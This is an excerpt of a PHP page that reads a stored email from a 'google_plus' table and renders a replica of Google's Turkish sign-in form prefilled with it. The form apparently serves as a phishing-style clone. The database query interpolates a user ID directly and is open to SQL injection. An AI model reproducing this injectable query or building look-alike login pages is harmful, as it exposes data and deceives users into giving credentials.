...
$query = mysql_query("SELECT user_email FROM `google_plus` WHERE `user_id`='$uid'"); 
...
<script type="text/javascript">
 function submitform()  {document.forms["gaia_loginform"].submit();}</script>
...
<form novalidate="" id="gaia_loginform" action="https://accounts.google.com/ServiceLoginAuth?service=oz&continue=https://plus.google.com/?gpsrc%3Dgplp0&hl=tr" method="post">
  <input type="hidden" name="continue" id="continue" value="https://plus.google.com/?gpsrc=gplp0">
  <input type="hidden" name="service" id="service" value="oz">
  <input type="hidden" name="dsh" id="dsh" value="-4872036056891356914">
  <input type="hidden" name="hl" id="hl" value="tr">
  <input type="hidden" name="GALX" value="moah_ptuMFw">
  <input type="hidden" id="pstMsg" name="pstMsg" value="1">
  <input type="hidden" id="dnConn" name="dnConn" value="">
  <input type="hidden" id="checkConnection" name="checkConnection" value="youtube:585:1">
...
<div class="email-div">
  <label for="Email"><strong class="email-label">E-posta</strong></label>
  <input type="email" spellcheck="false" name="Email" id="Email" value="<?=$email;?>">
</div>
<div class="passwd-div">
  <label for="Passwd"><strong class="passwd-label">Şifre</strong></label>
  <input type="password" name="Passwd" id="Passwd">
</div>
  <input type="submit" class="g-button g-button-submit" name="signIn" id="signIn" value="Oturum aç">
